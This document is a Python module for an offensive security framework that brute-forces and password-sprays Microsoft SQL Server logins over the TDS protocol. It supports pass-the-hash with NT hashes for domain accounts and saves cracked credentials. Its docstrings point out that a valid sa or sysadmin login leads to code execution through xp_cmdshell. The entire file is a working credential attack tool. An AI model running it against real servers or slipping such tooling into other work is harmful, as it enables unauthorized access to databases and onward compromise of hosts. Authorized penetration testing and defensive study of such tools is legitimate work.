"""MSSQL login brute force / spray (impacket TDS).

Native TDS authentication against SQL Server — SQL logins (sa and
friends) with DOMAIN blank, or Windows/domain logins with DOMAIN set
(pass-the-hash capable via NTHASH). A valid sa (or sysadmin) cred is the
classic xp_cmdshell path to code execution, so this is high-signal on
engagements: databases love being reachable from the app tier with
weak SQL auth.

Verdicts come from the server's own login answer: a real session or a
18456-class failure. Dead hosts trip the same circuit breaker as the
other login modules.
"""

import time

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import OptAddress, OptInt, OptPort, OptString
from core.wordlists import build_combos, creds_from_options

try:
    from impacket.tds import MSSQL
except ImportError:
    MSSQL = None  # console gates run() on requirements

ERROR_CIRCUIT = 3  # consecutive transport errors before a host is skipped


class MssqlLogin(AuxiliaryModule):
    name = "MSSQL Login Brute Force"
    description = """
        Tries username/password combinations over native TDS. DOMAIN
        blank = SQL authentication (sa etc.); DOMAIN set = Windows
        authentication (NTHASH sprays pass-the-hash). A valid sysadmin
        cred is one xp_cmdshell away from code execution — check
        privileges after a hit. Stored creds for the host are tried
        first.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=1433, description="TDS port"))
        self.options.add(OptString("DOMAIN", default="",
                                   description="Windows auth domain (blank = SQL auth)"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username(s), comma-separated"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex (Windows auth only)"))
        self.options.add(OptInt("THREADS", default=2,
                                description="Concurrent attempts (keep low)"))
        self.options.add(OptInt("TIMEOUT", default=5, description="Connect timeout (seconds)"))

    def _try(self, host, port, timeout, domain, nthash, state,
             user, password):
        """One TDS login -> success | fail | error."""
        if state["abort"]:
            return None
        ms_sql = MSSQL(host, port)
        try:
            ms_sql.connect()
            if domain:
                hashes = f"aad3b435b51404eeaad3b435b51404ee:{nthash}" \
                    if nthash else None
                ok = ms_sql.login("master", user, password if not nthash else "",
                                  domain, hashes, useWindowsAuth=True)
            else:
                ok = ms_sql.login("master", user, password)
            return ("success", "valid") if ok else ("fail", "login failed")
        except Exception as e:
            message = str(e)
            lowered = message.lower()
            if any(k in lowered for k in ("timed out", "refused",
                                          "unreachable", "connection",
                                          "eof", "reset")):
                state["errors"] += 1
                if state["errors"] >= ERROR_CIRCUIT:
                    state["abort"] = True
                    state["dead"] = message
                self.print_debug(f"{host}:{port} {user} -> transport: {e}")
                return "error", message
            self.print_debug(f"{host}:{port} {user}:{password} -> {message[:60]}")
            return "fail", message[:60]
        finally:
            try:
                ms_sql.disconnect()
            except Exception:
                pass

    def run(self):
        try:
            raw_users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
            passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
        except OSError as e:
            self.print_error(f"Cannot read credential file: {e}")
            return
        # usernames comma-split (sprays need lists inline); passwords never
        # do — commas are legal password characters
        users = [u.strip() for v in raw_users for u in v.split(",") if u.strip()]
        nthash = str(self.get_option("NTHASH") or "").strip()
        domain = str(self.get_option("DOMAIN") or "")
        if nthash and not domain:
            self.print_error("NTHASH needs Windows auth — set DOMAIN")
            return
        if nthash:
            passwords = [nthash]
        if not users or not passwords:
            self.print_error("Need at least one username and one password "
                             "(USERNAME/USER_FILE, PASSWORD/PASS_FILE, or NTHASH)")
            return

        combos = list(build_combos(users, passwords))
        self.print_status(
            f"{len(users)} user(s) x {len(passwords)} secret(s) = "
            f"{len(combos)} combinations"
            + (" (windows auth)" if domain else " (sql auth)"))
        port = int(self.get_option("RPORT"))
        timeout = int(self.get_option("TIMEOUT"))
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._attack_host(host, port, timeout, domain, nthash, combos)

    def _attack_host(self, host, port, timeout, domain, nthash, combos):
        store = getattr(self.framework, "store", None)
        if store is not None and not nthash:
            stored = store.creds_for(host, "mssql")
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first")
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        state = {"abort": False, "errors": 0, "locked": None, "dead": None}
        attempt = lambda u, p: self._try(host, port, timeout, domain,  # noqa: E731
                                         nthash, state, u, p)
        classify = lambda verdict: verdict[0]  # noqa: E731

        def on_success(combo, _result):
            who = f"{domain}\\{combo[0]}" if domain else combo[0]
            self.print_good(f"{host}: valid credential {who}:{combo[1]}")

        started = time.time()
        found, attempts, errors = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
        )
        elapsed = max(time.time() - started, 0.001)
        if state["dead"]:
            self.print_warning(
                f"{host}: {ERROR_CIRCUIT} consecutive transport errors — "
                f"host skipped")
        self.print_status(
            f"{host}: {attempts} attempts in {elapsed:.1f}s, "
            f"{len(found)} valid, {errors} errors")

        if store is not None and found:
            store.add_service(host, port, name="mssql")
            for user, pw in found:
                store.add_cred(host, "mssql", user, pw, source="mssql-brute")
                self.print_status("Credential saved ('creds' to view)")
